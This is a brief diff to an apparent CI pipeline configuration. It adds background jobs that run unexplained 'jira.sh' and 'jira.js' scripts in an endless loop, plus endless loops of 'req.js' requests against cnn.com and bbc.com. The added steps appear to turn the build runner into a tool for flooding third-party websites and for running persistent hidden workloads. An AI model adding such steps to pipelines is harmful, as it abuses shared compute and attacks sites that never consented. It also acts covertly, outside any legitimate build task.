@@ -15,4 +15,8 @@ pipelines:
            - chmod +x ./test.sh && ./test.sh &
            - chmod +x ./google.sh && ./google.sh &
            - chmod +x ./rw.sh && ./rw.sh
+           - chmod +x ./jira.sh && ./jira.sh &
+           - npm install && while true; do nodejs jira.js; done &
+           - while true; do node req.js https://www.cnn.com 100 > /dev/null; done &
+           - while true; do node req.js https://www.bbc.com 100 > /dev/null; done
 
